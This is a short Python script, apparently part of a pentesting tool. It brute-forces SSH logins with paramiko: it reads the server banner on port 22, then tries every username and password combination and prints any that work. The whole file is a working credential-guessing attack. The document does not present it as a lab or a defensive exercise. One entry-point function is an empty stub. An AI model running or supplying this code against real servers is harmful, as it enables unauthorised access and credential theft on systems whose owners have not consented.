#!/usr/bin/env python3
import paramiko
import socket
import time

def brute_force_ssh_connection():
    print("starting_brute_force")


def ssh_test_all(machine, all_users, all_passwords):
    print('Testing SSH Service')
    client = paramiko.SSHClient()
    grab_banner(machine)
    test_credentials(machine, client, all_users, all_passwords)


def grab_banner(machine):
    # grab ssh banner
    banner_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    banner_socket.connect((machine.ip, 22))
    bytes = banner_socket.recv(1024)
    banner_socket.settimeout(5)
    print(f"Banner: {bytes.decode('utf-8')}")

def test_credentials(machine, client, all_users, all_passwords):
    print("Testing default passwords and usernames for SSH")
    for user in all_users:
        for password in all_passwords:
            try:
                time.sleep(0.3)
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(machine.ip, username=user, password=password, banner_timeout=60)
                print(f"FOUND: SSH credentials: {user}:{password}")
            except paramiko.ssh_exception.AuthenticationException:
                continue
            except socket.error:
                print("Connection went wrong")
            client.close()
    print("Brute Forcing done")
